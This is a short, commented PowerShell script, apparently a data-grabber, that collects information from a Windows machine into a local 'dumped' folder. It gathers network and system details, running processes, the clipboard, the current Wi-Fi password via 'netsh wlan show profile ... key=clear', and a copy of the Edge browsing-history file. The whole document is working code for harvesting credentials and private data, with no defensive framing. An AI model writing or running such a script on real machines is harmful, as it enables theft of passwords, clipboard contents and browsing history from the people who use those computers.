mkdir dumped -Force #all the dumped data is stored in here
mkdir dumped/edge -Force #All the MS edge data is stored here

#below is just standard system and network info
arp -a > dumped/iplist.txt 
ipconfig > dumped/ipconfig.txt 
ipconfig /displaydns > dumped/dnsdisplay.txt 
systeminfo > dumped/sysinfo.txt 
tasklist > dumped/tasklist.txt

Get-Clipboard > dumped/clipboard.txt

#This gets network information by checking the network name and getting the info based on that.
$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt

#This command copies edge history data to dumped/edge
$origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
$edgehistorycopypath="dumped\edge"
Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Continue